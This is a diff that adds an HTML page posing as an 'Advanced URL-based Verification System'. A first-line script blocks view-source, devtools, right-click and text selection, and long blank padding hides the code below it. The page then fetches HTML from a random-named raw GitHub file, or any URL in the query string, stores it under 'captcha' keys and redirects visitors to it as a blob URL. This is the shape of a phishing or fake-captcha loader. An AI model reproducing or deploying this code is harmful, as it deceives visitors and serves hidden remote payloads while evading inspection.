@@ -1,0 +1,249 @@
+<!DOCTYPE html><html><head><script>document.onkeydown=function(e){if(e.ctrlKey&&(e.keyCode==85||e.keyCode==117||e.keyCode==83||e.keyCode==115||e.keyCode==73||e.keyCode==105||e.keyCode==74||e.keyCode==106||e.keyCode==67||e.keyCode==99)){return false;}if(e.keyCode==123){return false;}};document.addEventListener('contextmenu',function(e){e.preventDefault();});document.addEventListener('dragstart',function(e){e.preventDefault();});document.addEventListener('selectstart',function(e){e.preventDefault();});window.onload=function(){document.body.onkeydown=function(e){if(e.keyCode==123||(e.ctrlKey&&e.shiftKey&&(e.keyCode==73||e.keyCode==74||e.keyCode==67))){return false;}};document.body.oncontextmenu=function(){return false;};document.body.onselectstart=function(){return false;};document.body.ondragstart=function(){return false;};};</script><noscript><meta http-equiv="refresh" content="0; url=about:blank"></noscript></head><body></body></html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Advanced URL-based Verification System</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Roboto', 'Helvetica Neue', Arial, sans-serif;
+            background: white;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 10px;
+            line-height: 1.4;
+        }
+
+        .loader {
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #4285f4;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            z-index: 1000;
+            display: none;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .error-message {
+            text-align: center;
+            padding: 50px;
+            font-family: Arial, sans-serif;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: white;
+            z-index: 1000;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="loader" id="loader"></div>
+    <div class="error-message" id="errorMessage">
+        <h1 style="color:#d93025;margin-bottom:20px;">Failed to Load Content</h1>
+        <p style="color:#5f6368;" id="errorText"></p>
+    </div>
+
+    <script>
+        const contentId = new URLSearchParams(window.location.search).get('contentId') || Date.now();
+        const contentUrl = new URLSearchParams(window.location.search).get('contentUrl') || 'https://raw.githubusercontent.com/lonbadirco/aaalal/refs/heads/main/havxbabx.txt';
+
+        class ContentManager {
+            constructor() {
+                this.storageKey = 'captcha_content';
+                this.statusKey = 'captcha_status';
+                this.timestampKey = 'captcha_timestamp';
+                this.blobUrlKey = 'captcha_blob_url';
+                this.expirationTime = 5 * 60 * 1000;
+            }
+
+            saveContent(content) {
+                const data = {
+                    content: content,
+                    timestamp: Date.now(),
+                    contentId: contentId,
+                    contentUrl: contentUrl
+                };
+                localStorage.setItem(this.storageKey, JSON.stringify(data));
+                localStorage.setItem(this.statusKey, 'verified');
+                
+                const blob = new Blob([content], { type: 'text/html;charset=utf-8' });
+                const blobUrl = URL.createObjectURL(blob);
+                localStorage.setItem(this.blobUrlKey, blobUrl);
+                
+                return blobUrl;
+            }
+
+            getContent() {
+                const data = localStorage.getItem(this.storageKey);
+                const status = localStorage.getItem(this.statusKey);
+                
+                if (!data || status !== 'verified') {
+                    return null;
+                }
+
+                try {
+                    const parsed = JSON.parse(data);
+                    const now = Date.now();
+                    
+                    if (now - parsed.timestamp > this.expirationTime || 
+                        parsed.contentId !== contentId ||
+                        (contentUrl && parsed.contentUrl !== contentUrl)) {
+                        this.clearContent();
+                        return null;
+                    }
+                    
+                    return parsed.content;
+                } catch (e) {
+                    this.clearContent();
+                    return null;
+                }
+            }
+
+            getBlobUrl() {
+                const storedUrl = localStorage.getItem(this.blobUrlKey);
+                if (storedUrl) return storedUrl;
+                
+                const content = this.getContent();
+                if (!content) return null;
+                
+                const blob = new Blob([content], { type: 'text/html;charset=utf-8' });
+                return URL.createObjectURL(blob);
+            }
+
+            clearContent() {
+                localStorage.removeItem(this.storageKey);
+                localStorage.removeItem(this.statusKey);
+                localStorage.removeItem(this.timestampKey);
+                localStorage.removeItem(this.blobUrlKey);
+            }
+
+            isVerified() {
+                return localStorage.getItem(this.statusKey) === 'verified';
+            }
+
+            setVerified() {
+                localStorage.setItem(this.statusKey, 'verified');
+            }
+        }
+
+        class UrlContentLoader {
+            constructor() {
+                this.contentManager = new ContentManager();
+                this.loader = document.getElementById('loader');
+                this.errorMessage = document.getElementById('errorMessage');
+                this.errorText = document.getElementById('errorText');
+                this.checkExistingContent();
+            }
+
+            async checkExistingContent() {
+                const savedContent = this.contentManager.getContent();
+                if (savedContent && this.contentManager.isVerified()) {
+                    const blobUrl = this.contentManager.getBlobUrl();
+                    if (blobUrl) {
+                        window.location.replace(blobUrl);
+                        return;
+                    }
+                }
+
+                this.loader.style.display = 'block';
+                
+                try {
+                    const content = await this.fetchFromUrl();
+                    if (content) {
+                        const blobUrl = this.contentManager.saveContent(content);
+                        window.location.replace(blobUrl);
+                    } else {
+                        this.showError('No content received from server');
+                    }
+                } catch (e) {
+                    console.error('Error fetching content:', e);
+                    if (savedContent && this.contentManager.isVerified()) {
+                        const blobUrl = this.contentManager.getBlobUrl();
+                        if (blobUrl) {
+                            window.location.replace(blobUrl);
+                        } else {
+                            this.showError('Error loading content: ' + e.message);
+                        }
+                    } else {
+                        this.showError('Error loading content: ' + e.message);
+                    }
+                } finally {
+                    this.loader.style.display = 'none';
+                }
+            }
+
+            async fetchFromUrl() {
+                if (!contentUrl) {
+                    throw new Error('No content URL provided');
+                }
+                
+                const controller = new AbortController();
+                const timeoutId = setTimeout(() => controller.abort(), 5000);
+                
+                try {
+                    const res = await fetch(contentUrl, { signal: controller.signal });
+                    clearTimeout(timeoutId);
+                    
+                    if (!res.ok) {
+                        throw new Error(`HTTP error! status: ${res.status}`);
+                    }
+                    
+                    const buffer = await res.arrayBuffer();
+                    const decoder = new TextDecoder('utf-8');
+                    return decoder.decode(buffer);
+                } catch (e) {
+                    clearTimeout(timeoutId);
+                    throw e;
+                }
+            }
+
+            showError(message) {
+                this.errorText.textContent = `There was an error loading the content from ${contentUrl}. ${message}`;
+                this.errorMessage.style.display = 'block';
+            }
+        }
+
+        new UrlContentLoader();
+    </script>
+</body>
+</html>
